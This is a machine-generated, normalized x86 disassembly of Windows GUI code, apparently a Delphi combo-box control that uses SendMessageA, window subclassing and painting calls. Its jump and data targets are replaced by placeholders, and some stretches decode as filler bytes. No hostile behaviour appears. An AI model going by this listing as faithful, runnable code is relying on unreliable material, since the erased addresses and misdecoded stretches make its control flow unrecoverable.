mov eax esi
call sub_456054
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_4463f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_457154
pop esi
pop ebx
retn
sub_446430
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446496
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44649d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419df4
sub_4464a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4464cc
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4046f8
mov edx esi
xchg edx eax
call sub_4046f8
mov eax [ esi ]
call sub_40456c
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446524
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_446588
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44f854
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44f884
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44658f
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_446594
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4465b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40456c
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4465dc
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_456054
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44fd90
sub_446610
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446683
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40456c
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44668a
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_446694
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446707
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40456c
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_456054
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44670e
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_446714
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_451d80
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_44f010
mov edx 0x19
mov eax ebx
call sub_44f034
mov dl 0x1
mov eax ebx
call sub_456288
xor edx edx
mov eax ebx
call sub_44fa18
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44e430
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_446ab8
call sub_422400
mov [ ebx + 0x24c ] eax
push ebx
push sub_446bb0
call sub_422400
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_446808
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_466614
mov eax [ esi + 0x24c ]
call sub_466614
mov eax [ esi + 0x208 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_44688a
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_453448
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_4468d4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_456054
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4468f8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_456054
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_456054
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_446940
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_44696c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_456054
push eax
call SendMessageA
sub_4469a8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_456358
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_456054
push eax
call SendMessageA
sub_4469f8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_456054
push eax
call SetWindowTextA
sub_446a34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_4468d4
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_446a6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45566c
pop esi
pop ebx
retn
mov eax ebx
call sub_4535f4
sub_446a90
push ebx
mov ebx eax
mov eax ebx
call sub_451444
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_446ab8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_466768
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44f398
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cf0
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44ff14
jmp r-xdata
sub_446be4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446e9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454ea8
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454f90
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4468d4
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ff14
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4034ac
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466768
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444e00
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455058
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4468d4
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4468f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_446ec0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44ffdc
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_453a68
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_455058
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_424bb8
call sub_423f34
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424bf4
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4539d4
test al al
jne r-xdata
mov eax ebx
call sub_4468d4
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4468f8
jmp r-xdata
sub_446fce
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_44712c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447133
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
jmp [ eax * 4 + jump_table_446ffc ]
mov eax edi
mov si 0xffe9
call sub_4034ac
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_4034ac
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_4034ac
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44f884
mov eax edi
mov si 0xffeb
call sub_4034ac
mov eax edi
mov si 0xffb2
call sub_4034ac
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4034ac
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_4547d8
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_4548c4
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_456054
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_456054
push eax
call PostMessageA
jmp r-xdata
sub_447160
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447209
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_44e448
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_425224
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447210
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_4253d8
sub_44723c
push esi
push edi
mov esi eax
mov eax esi
call sub_451928
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_447264
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4472b8
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_4034ac
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_4472e4
push ebx
mov ebx eax
mov eax ebx
call sub_45300c
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_456054
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_44731c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_4473b2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4473b9
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_4473b9
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_4473d8
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_447408
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447487
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44748e
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_447494
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4474d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_44751d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447524
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_44752c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_446714
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403280
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4475b0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4032b0
mov eax [ esi + 0x278 ]
call sub_4032b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_446808
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_447600
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_4535f4
sub_447664
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_452e0c
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4476c5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_4472e4
mov eax ebx
call sub_456054
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_4032b0
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_456054
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_447808
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_4533f0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_447858
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
